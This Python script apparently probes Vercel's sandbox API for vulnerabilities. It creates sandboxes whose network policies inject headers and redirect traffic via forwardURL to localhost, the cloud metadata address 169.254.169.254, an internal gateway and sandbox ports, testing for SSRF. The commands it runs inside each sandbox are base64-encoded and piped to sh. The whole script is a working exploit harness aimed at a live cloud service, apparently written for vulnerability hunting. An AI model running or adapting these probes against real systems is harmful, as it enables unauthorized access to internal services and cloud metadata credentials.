# -*- coding: utf-8 -*-
"""transform / forwardURL 面 (v47)
P1: transform header 注入验证 (httpbin.org/headers 回显)
P2: forwardURL -> 127.0.0.1 (控制面执行? SSRF!)
P3: forwardURL -> 169.254.169.254 (MMDS!)
P4: forwardURL -> 172.31.0.2 / 8.8.8.8
P5: forwardURL -> 沙箱内端口 (26661/23456)"""
import base64, json, sys, time, urllib.request, urllib.error
sys.path.insert(0, r'F:\scan\skills\non-traditional-vuln-hunting')
sys.stdout.reconfigure(encoding='utf-8')
from vercel_driver import api, cmd, TOKEN, TEAM, PROJ

NAME = 'tf47'

def api_raw(method, path, body=None, ctype='application/json', timeout=120):
    req = urllib.request.Request('https://api.vercel.com' + path, method=method)
    req.add_header('Authorization', 'Bearer ' + TOKEN)
    if ctype:
        req.add_header('Content-Type', ctype)
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode(errors='replace')[:1500]
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors='replace')[:1500]
    except Exception as e:
        return -1, 'EXC %s' % e

def parse_data(r):
    out = ''
    for line in r.splitlines():
        if '"data"' in line:
            try:
                out += json.loads(line).get('data', '')
            except Exception:
                pass
    return out

def mk(network_policy):
    api("DELETE", "/v2/sandboxes/%s?teamId=%s&projectId=%s" % (NAME, TEAM, PROJ))
    time.sleep(3)
    body = {"projectId": PROJ, "name": NAME, "networkPolicy": network_policy}
    for attempt in range(8):
        c, r = api("POST", "/v4/sandboxes?teamId=%s" % TEAM, body, 90)
        if c == 429:
            print('[create] 429 retry %d' % (attempt + 1), flush=True)
            time.sleep(20)
            continue
        break
    print('[create] -> %d %s' % (c, (r or '')[:200]), flush=True)
    if c != 200:
        sys.exit(1)
    return json.loads(r)['sandbox']['currentSessionId']

def probe(sid, url, tag, extra=''):
    b64 = base64.b64encode(('echo "== %s"; curl -s --max-time 8 -i %s 2>&1 | head -25; %s' % (tag, url, extra)).encode()).decode()
    c, r = cmd(sid, 'sh', ['-c', 'echo %s | base64 -d | sh' % b64], timeout_ms=30000)
    print('[%s] %s' % (tag, parse_data(r).strip()[:600]), flush=True)

if __name__ == '__main__':
    # ===== P1: transform 注入 =====
    print('=== P1: transform injection ===', flush=True)
    np1 = {"allow": {"httpbin.org": [{"transform": [{"headers": {"x-inj-mark": "INJ_42"}}]}]}}
    sid1 = mk(np1)
    print('sid1 =', sid1, flush=True)
    time.sleep(8)
    probe(sid1, 'https://httpbin.org/headers', 'P1-inject')
    api("DELETE", "/v2/sandboxes/%s?teamId=%s&projectId=%s" % (NAME, TEAM, PROJ))
    time.sleep(3)

    # ===== P2-P5: forwardURL SSRF 探测 =====
    print('=== P2: forwardURL 127.0.0.1 ===', flush=True)
    np2 = {"allow": {"httpbin.org": [{"forwardURL": "http://127.0.0.1:8080/ssrf_probe"}]}}
    sid2 = mk(np2)
    print('sid2 =', sid2, flush=True)
    time.sleep(8)
    probe(sid2, 'http://httpbin.org/anything', 'P2-127')
    api("DELETE", "/v2/sandboxes/%s?teamId=%s&projectId=%s" % (NAME, TEAM, PROJ))
    time.sleep(3)

    print('=== P3: forwardURL MMDS ===', flush=True)
    np3 = {"allow": {"httpbin.org": [{"forwardURL": "http://169.254.169.254/latest/meta-data/"}]}}
    sid3 = mk(np3)
    print('sid3 =', sid3, flush=True)
    time.sleep(8)
    probe(sid3, 'http://httpbin.org/', 'P3-mmds')
    api("DELETE", "/v2/sandboxes/%s?teamId=%s&projectId=%s" % (NAME, TEAM, PROJ))
    time.sleep(3)

    print('=== P4: forwardURL 网关/公网 ===', flush=True)
    np4 = {"allow": {"httpbin.org": [{"forwardURL": "http://172.31.0.2/"}, {"forwardURL": "http://8.8.8.8:53/"}]}}
    sid4 = mk(np4)
    print('sid4 =', sid4, flush=True)
    time.sleep(8)
    probe(sid4, 'http://httpbin.org/', 'P4-gw')
    api("DELETE", "/v2/sandboxes/%s?teamId=%s&projectId=%s" % (NAME, TEAM, PROJ))
    time.sleep(3)

    print('=== P5: forwardURL 到沙箱内端口 ===', flush=True)
    np5 = {"allow": {"httpbin.org": [{"forwardURL": "http://127.0.0.1:26661/"}]}}
    sid5 = mk(np5)
    print('sid5 =', sid5, flush=True)
    time.sleep(8)
    probe(sid5, 'http://httpbin.org/', 'P5-internal')
    api("DELETE", "/v2/sandboxes/%s?teamId=%s&projectId=%s" % (NAME, TEAM, PROJ))
    print('CLEANED', flush=True)
